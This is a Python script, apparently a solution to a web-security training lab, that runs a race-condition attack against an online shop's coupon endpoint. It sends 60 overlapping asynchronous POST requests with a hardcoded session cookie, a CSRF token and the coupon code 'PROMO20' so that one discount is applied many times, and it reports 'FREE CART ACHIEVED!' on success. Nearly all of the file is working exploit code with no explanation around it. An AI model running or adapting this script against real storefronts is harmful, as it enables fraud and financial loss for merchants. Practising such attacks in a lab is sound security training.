import asyncio
import aiohttp
import time
from aiohttp import TCPConnector

# CONFIGURABLE VARIABLES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

# OVERLAP CONFIG
groups = 20           # Number of burst groups
group_size = 3       # Concurrent requests per group
group_delay = 0.001    # Delay BETWEEN starting groups (not after completion)

async def overlap_attack():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    total_successes = 0
    all_tasks = []
    
    print(f"[*] Starting OVERLAP attack at {time.ctime()}")
    print(f"[*] Strategy: {groups} groups × {group_size} concurrent = {groups * group_size} total")
    print(f"[*] Group start delay: {group_delay}s between firing groups")
    print("-" * 60)
    
    connector = TCPConnector(limit=groups * group_size, keepalive_timeout=10)
    start_time = time.time()
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # Schedule all groups to start with delays
        for group in range(groups):
            # Fire this group's requests
            for i in range(group_size):
                task_id = f"{group+1}-{i+1}"
                task = asyncio.create_task(single_race_request(session, url, headers, data, task_id, start_time))
                all_tasks.append(task)
            
            # Wait before firing next group (OVERLAP key)
            if group < groups - 1:
                await asyncio.sleep(group_delay)
        
        # Wait for ALL requests from ALL groups to complete
        results = await asyncio.gather(*all_tasks)
        total_successes = sum(results)
    
    print("-" * 60)
    print(f"[*] Attack completed at {time.ctime()}")
    print(f"[*] Total successes: {total_successes}")
    
    if total_successes >= 5:
        print("[+] FREE CART ACHIEVED!")
    else:
        print(f"[-] Need {5-total_successes} more successes")

async def single_race_request(session, url, headers, data, req_id, start_time):
    """Single race condition attempt with relative timing"""
    request_start = time.time()
    relative_start = request_start - start_time
    
    try:
        async with session.post(url, headers=headers, data=data, timeout=aiohttp.ClientTimeout(total=3)) as resp:
            body = await resp.text()
            end = time.time()
            response_time = end - request_start
            
            if "Coupon already applied" in body:
                result = "DUPLICATE"
                success = 0
            elif "apply coupon" in body or (resp.status == 200 and len(body) == 7171):
                result = "SUCCESS"
                success = 1
            else:
                result = f"OTHER_{resp.status}"
                success = 0
            
            print(f"[{req_id}] {result} | Start:+{relative_start:.3f}s | Δ:{response_time:.3f}s")
            return success
            
    except asyncio.TimeoutError:
        print(f"[{req_id}] TIMEOUT | Start:+{relative_start:.3f}s")
        return 0
    except Exception as e:
        print(f"[{req_id}] ERROR: {str(e)[:15]} | Start:+{relative_start:.3f}s")
        return 0

if __name__ == "__main__":
    asyncio.run(overlap_attack())
